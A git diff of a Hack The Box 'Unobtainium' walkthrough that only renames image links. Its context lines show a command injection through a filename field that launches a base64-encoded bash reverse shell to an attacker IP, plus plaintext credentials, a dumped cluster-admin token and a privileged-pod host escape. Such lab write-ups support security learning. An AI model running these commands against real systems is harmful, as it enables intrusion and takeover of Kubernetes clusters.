@@ -28,11 +28,11 @@ description: "A no-frills walkthrough of Unobtainium, a hard level challenge box
 
 ![/images/unobtainium/Untitled.png](/images/unobtainium/Untitled.png)
 
-![Challenge style](/images/unobtainium/Untitled%201.png)
+![Challenge style](/images/unobtainium/Untitled_1.png)
 
 Challenge style
 
-![Difficulty](/images/unobtainium/Untitled%202.png)
+![Difficulty](/images/unobtainium/Untitled_2.png)
 
 Difficulty
 
@@ -158,7 +158,7 @@ Opening the machines IP in browser we can see a simple website. It describes a c
 
 I'm on Kali so I downloaded the .deb version for analysis.
 
-![screenshot of site](/images/unobtainium/Untitled%203.png)
+![screenshot of site](/images/unobtainium/Untitled_3.png)
 
 [http://10.129.84.247/downloads/checksums.txt](http://10.129.84.247/downloads/checksums.txt)
 
@@ -172,7 +172,7 @@ d61b48f165dab41af14c49232975f6a1  unobtainium_1.0.0_amd64.snap
 
 After downloading the package I unzipped it like so:
 
-![/images/unobtainium/Untitled%204.png](/images/unobtainium/Untitled%204.png)
+![/images/unobtainium/Untitled_4.png](/images/unobtainium/Untitled_4.png)
 
 We can now extract the files from the .deb package using `dpkg-deb`.
 
@@ -301,7 +301,7 @@ unobtainium
 
 We can find an executable for the application in: `extracted-deb/opt/unobtainium`
 
-![/images/unobtainium/Untitled%205.png](/images/unobtainium/Untitled%205.png)
+![/images/unobtainium/Untitled_5.png](/images/unobtainium/Untitled_5.png)
 
 Let's try running it and see what happens.
 
@@ -313,15 +313,15 @@ Let's try running it and see what happens.
 
 Looks like it launches an electron app, but we get an error: `Unable to reach unobtainium.htb`
 
-![/images/unobtainium/Untitled%206.png](/images/unobtainium/Untitled%206.png)
+![/images/unobtainium/Untitled_6.png](/images/unobtainium/Untitled_6.png)
 
 We need to update our `/etc/hosts` file.
 
-![/images/unobtainium/Untitled%207.png](/images/unobtainium/Untitled%207.png)
+![/images/unobtainium/Untitled_7.png](/images/unobtainium/Untitled_7.png)
 
 After playing around and testing things a bit it seems like the only functionality implemented is the `UI`, `message log`, and `post messages` function. There is a Todo screen with the following:
 
-![/images/unobtainium/Untitled%208.png](/images/unobtainium/Untitled%208.png)
+![/images/unobtainium/Untitled_8.png](/images/unobtainium/Untitled_8.png)
 
 Message log displays messages in `JSON`
 
@@ -335,7 +335,7 @@ We enumerate a possible username from this: `felamos`
 
 Let's try sniffing the requests with `Wireshark` for anything interesting.
 
-![/images/unobtainium/Untitled%209.png](/images/unobtainium/Untitled%209.png)
+![/images/unobtainium/Untitled_9.png](/images/unobtainium/Untitled_9.png)
 
 Perfect. Looks like we captured a `POST` request that sends credentials in plaintext. Let's note what we have gathered:
 
@@ -524,7 +524,7 @@ Connection: close
 
 Next lets try exploiting the RCE, looking through the index.js source we can see it takes a filename parameter and returns the same filename if successful. This means we need to craft our payload to send us the confirmation. We'll setup a `HTTP server` with `updog`.
 
-![/images/unobtainium/Untitled%2010.png](/images/unobtainium/Untitled%2010.png)
+![/images/unobtainium/Untitled_10.png](/images/unobtainium/Untitled_10.png)
 
 Then we run our attack by `POST` to the `/upload` endpoint.
 
@@ -546,7 +546,7 @@ Connection: close
 }
 ```
 
-![Success](/images/unobtainium/Untitled%2011.png)
+![Success](/images/unobtainium/Untitled_11.png)
 
 Success
 
@@ -567,33 +567,33 @@ YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC80NDQ0IDA+JjEnCg==
 echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC80NDQ0IDA+JjEnCg== | base64 -d | bash 2>/dev/null
 ```
 
-![listen for connection](/images/unobtainium/Untitled%2012.png)
+![listen for connection](/images/unobtainium/Untitled_12.png)
 
 listen for connection
 
-![send exploit](/images/unobtainium/Untitled%2013.png)
+![send exploit](/images/unobtainium/Untitled_13.png)
 
 send exploit
 
-![success!](/images/unobtainium/Untitled%2014.png)
+![success!](/images/unobtainium/Untitled_14.png)
 
 success!
 
 We can the get our user flag!
 
-![/images/unobtainium/Untitled%2015.png](/images/unobtainium/Untitled%2015.png)
+![/images/unobtainium/Untitled_15.png](/images/unobtainium/Untitled_15.png)
 
 The fact we got our user flag as root is an obvious indicator that we are in a container. Now we try some enumeration with `LinEnum`.
 
-![/images/unobtainium/Untitled%2016.png](/images/unobtainium/Untitled%2016.png)
+![/images/unobtainium/Untitled_16.png](/images/unobtainium/Untitled_16.png)
 
-![/images/unobtainium/Untitled%2017.png](/images/unobtainium/Untitled%2017.png)
+![/images/unobtainium/Untitled_17.png](/images/unobtainium/Untitled_17.png)
 
-![/images/unobtainium/Untitled%2018.png](/images/unobtainium/Untitled%2018.png)
+![/images/unobtainium/Untitled_18.png](/images/unobtainium/Untitled_18.png)
 
-![/images/unobtainium/Untitled%2019.png](/images/unobtainium/Untitled%2019.png)
+![/images/unobtainium/Untitled_19.png](/images/unobtainium/Untitled_19.png)
 
-![/images/unobtainium/Untitled%2020.png](/images/unobtainium/Untitled%2020.png)
+![/images/unobtainium/Untitled_20.png](/images/unobtainium/Untitled_20.png)
 
 Looks like we are in `kubernetes` and there's an interesting `cron job`:
 
@@ -610,17 +610,17 @@ Download kubectl to our local machine:
 
 `curl -LO "[https://dl.k8s.io/release/$](https://dl.k8s.io/release/$)(curl -L -s [https://dl.k8s.io/release/stable.txt](https://dl.k8s.io/release/stable.txt))/bin/linux/amd64/kubectl"`
 
-![/images/unobtainium/Untitled%2021.png](/images/unobtainium/Untitled%2021.png)
+![/images/unobtainium/Untitled_21.png](/images/unobtainium/Untitled_21.png)
 
 Then download it from our HTTP server
 
-![/images/unobtainium/Untitled%2022.png](/images/unobtainium/Untitled%2022.png)
+![/images/unobtainium/Untitled_22.png](/images/unobtainium/Untitled_22.png)
 
 Now we try enumerate some:
 
-![/images/unobtainium/Untitled%2023.png](/images/unobtainium/Untitled%2023.png)
+![/images/unobtainium/Untitled_23.png](/images/unobtainium/Untitled_23.png)
 
-![/images/unobtainium/Untitled%2024.png](/images/unobtainium/Untitled%2024.png)
+![/images/unobtainium/Untitled_24.png](/images/unobtainium/Untitled_24.png)
 
 ```bash
 root@webapp-deployment-5d764566f4-lrpt9:~# ./kc describe pods devnode-deployment-cd86fb5c-6ms8d -n dev
@@ -685,17 +685,17 @@ curl 172.17.0.9:3000/ -XPUT -d '{"auth":{"name":"felamos","password":"Winter2021
 curl 172.17.0.9:3000/upload -XPOST -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC81NTU1IDA+JjEnCg== | base64 -d | bash 2>/dev/null"}' -H "Content-Type: application/json"
 ```
 
-![/images/unobtainium/Untitled%2025.png](/images/unobtainium/Untitled%2025.png)
+![/images/unobtainium/Untitled_25.png](/images/unobtainium/Untitled_25.png)
 
 Success!
 
 We can repeat the process of getting `kubectl`.
 
-![/images/unobtainium/Untitled%2026.png](/images/unobtainium/Untitled%2026.png)
+![/images/unobtainium/Untitled_26.png](/images/unobtainium/Untitled_26.png)
 
 Looks like we can now dump the secrets.
 
-![/images/unobtainium/Untitled%2027.png](/images/unobtainium/Untitled%2027.png)
+![/images/unobtainium/Untitled_27.png](/images/unobtainium/Untitled_27.png)
 
 Notice the `c-admin-token-tfmp2` this is the cluster admin secret!
 
@@ -719,7 +719,7 @@ namespace:  11 bytes
 
 Check if we can create pods.
 
-![/images/unobtainium/Untitled%2028.png](/images/unobtainium/Untitled%2028.png)
+![/images/unobtainium/Untitled_28.png](/images/unobtainium/Untitled_28.png)
 
 Now that we can create pods lets do some research on how to abuse this, if we can create a malicious pod perhaps that's our path to real root...
 
@@ -729,7 +729,7 @@ Let's go with option 1 - Everything Allowed due to us having the cluster admin s
 
 Download the `yaml` to our local machine and edit it, then following the badpods method we create our pod then execute on it to get our root flag!
 
-![/images/unobtainium/Untitled%2029.png](/images/unobtainium/Untitled%2029.png)
+![/images/unobtainium/Untitled_29.png](/images/unobtainium/Untitled_29.png)
 
 ```yaml
 apiVersion: v1
@@ -766,4 +766,4 @@ spec:
 ./kc --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow -n default exec -it everything-allowed-exec-pod -- chroot /host bash
 ```
 
-![/images/unobtainium/Untitled%2030.png](/images/unobtainium/Untitled%2030.png)
+![/images/unobtainium/Untitled_30.png](/images/unobtainium/Untitled_30.png)
